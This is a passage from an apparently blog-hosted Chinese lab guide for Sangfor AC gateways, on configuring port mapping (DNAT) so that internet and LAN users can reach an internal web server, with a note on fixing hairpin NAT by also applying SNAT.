title="实验原理"></a>实验原理</h2><p>AC作为网关部署在公司互联网出口，当有外部用户，需要访问公司网站时，需要将AC的外网IP地址与端口映射到内网网站的IP地址与端口。</p><h2 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h2><p>某大型集团公司，其内部新建了一套网站系统，位于微软域控服务器上。<br>要求一：现在需要从互联网（Internet-WEB server）访问该网站，访问的IP地址为AC的WAN口地址。<br>要求二：为方便内网员工访问，员工在办公区也可以使用AC的WAN口地址，访问位于于微软域控上的网站。</p><h2 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h2><p><img src="https://oss.edu.sangfor.com.cn/file/20220418/AC%E5%AE%9E%E9%AA%8C1%E9%83%A8%E7%BD%B2220418170816453o4av5.png" alt="AC实验1部署.png"></p><h2 id="实验设备"><a href="#实验设备" class="headerlink" title="实验设备"></a>实验设备</h2><p>1、总部AC ，作总部出口网关使用<br>2、微软域控，作为总部的服务器，本实验中主要作用为WEB服务器,理解为集团公司网站。<br>3、PC1，普通办公PC，员工办公使用。<br>4、Internet-WEB Server， 本实验中，作为在互联网上的客户端，访问集团公司网站（微软域控上的网站）</p><h2 id="环境预配"><a href="#环境预配" class="headerlink" title="环境预配"></a>环境预配</h2><p>环境预配，是指已经实验场景化的配置边界。<br>实验环境中，<strong>非深信服设备，不需要学员配置。</strong>如交换机、路由器、PC、服务器。</p><p>实验环境中，<strong>深信服设备，需要学员按实验拓扑说明进行配置。</strong></p><p>实验环境中，配置基本遵循上述两条原则，<strong>少数实验例外</strong>。例外过程，在实验步骤中说明</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>一、配置总部AC的网络（操作对象：总部AC）</p><p>登录设备过程略</p><p>1.1 开始配置网络</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220126/image220126162610618wmhra.png" alt="image.png"></p><p>1.2 选择路由模式</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220126/image22012616274665461ibb.png" alt="image.png"></p><p>1.3 根据拓扑图，配置网卡，如下图</p><p>其中<br>eth1为LAN口，即办公区<br>eth2为DMZ口，即服务器区<br>eth3为WAN口，即互联网区</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image2201271300504664knzs.png" alt="image.png"></p><p>1.4 配置eth1</p><p>eth1接办公区，IP地址参照拓扑图配置</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image220127131616695za1gy.png" alt="image.png"></p><p>1.5 配置eth3</p><p>eth3接互联网区，IP地址参照拓扑图配置</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220126/image2201261721328713hwx0.png" alt="image.png"></p><p>1.6 配置eth2</p><p>eth2接DMZ区，即服务器区，IP地址参照拓扑图配置</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220126/image220126171325751k1dw5.png" alt="image.png"></p><p>1.7 配置代理上网</p><p>这里配置代理办公网段上网。办公网网段为192.168.1.0&#x2F;24</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220126/image2201261717284730snac.png" alt="image.png"></p><p>1.8 检查无误后提交</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image220127131823425ugehh.png" alt="image.png"></p><p>二、配置从互联网访问集团网站。（操作对象：总部AC）</p><p>2.1 新建端口映射–简单规则</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image2201271403145337uf3p.png" alt="image.png"></p><p>将AC的WAN口(124.126.100.2) TCP 8080映射到微软域控(172.16.0.100)的TCP 80</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image220127140423759j7ywd.png" alt="image.png"></p><p>三、使用Internet-WEB Server验证上步配置(操作对象：Internet-web Server)</p><p>因为Internet-WEB Server为Linux，所以这里使用curl命令代替浏览器</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span>  <span class="hljs-number">124.126.100.2:8080</span><br></code></pre></td></tr></table></figure><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image2201271407259700o68v.png" alt="image.png"></p><p>如图，访问成功。</p><p>四、解决办公网PC使用互联网地址访问域控的问题。（操作对象：总部AC）</p><p>为了解决办公网PC使用互联网地址访问微软域控的问题,我们可以在总部AC的LAN口进行目标地址转换工作。</p><p>操作如下：</p><p>4.1 新增端口映射–&gt;高级规则</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image2201272156011339zx3c.png" alt="image.png"></p><p>4.2 配置DNAT生效的端口、源IP、目标IP</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image220127215950742uq3xl.png" alt="image.png"></p><p>继续向下滚动</p><p>4.3 配置DNAT生效的源端口、目标端口</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image220127220223558zm4sm.png" alt="image.png"></p><p>4.4 配置DNAT转换后的IP与端口（即微软域控的80端口）</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image220127220353193qwrwp.png" alt="image.png"></p><h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>当从WAN口使用WAN口IP地址访问DMZ区服务器时， 端口映射规则（DNAT）在WAN口生效。普通端口映射多数是这种原理。</p><p>当从LAN口使用WAN口IP地址访问DMZ区服务器时， 端口映射规则（DNAT）在LAN口生效。此类规则比较少见，属于端口映射的高级规则。</p><h2 id="实验思考（有能力与时间可以学习）"><a href="#实验思考（有能力与时间可以学习）" class="headerlink" title="实验思考（有能力与时间可以学习）"></a>实验思考（有能力与时间可以学习）</h2><p>当从DMZ其他服务器使用WAN口IP地址访问DMZ区服务器时，如果同样的方法，配置端口映射高级规则，能否生效？为什么？</p><p>答案：</p><p>不能生效。假设DMZ其他服务器IP地址是172.16.0.200</p><p>其原因如下图</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/%E4%BC%9A%E8%AF%9D%E4%B8%8D%E4%B8%80%E8%87%B4.drawio1220127222325568ph3hs.png" alt="会话不一致.drawio 1.png"></p><p><strong>思考：如何解决会话不一致的问题？</strong></p><p>答案：</p><p>在AC转换DNAT的同时，也转一下SNAT，原理如下图</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/%E4%BC%9A%E8%AF%9D%E4%B8%8D%E4%B8%80%E8%87%B42.drawio220127223100041ythhx.png" alt="会话不一致2.drawio.png"></p><p>深信服设备操作方法，在新建端口映射高级规则的最后，钩选发布服务器即可。</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image220127223425920t28lm.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;【全网行为管理】02-AC的端口映射&lt;/p&gt;
&lt;p&gt;装备实验&lt;/p&gt;
&lt;p&gt;开始实验01:00:00&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss.edu.sangfor.com.cn/file/20230803/%E6%A0%A1%E4%BC%81%E5%B0</summary>
      
    
    
    
    
    <category term="深信服" scheme="http://example.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
  </entry>
  
</feed>
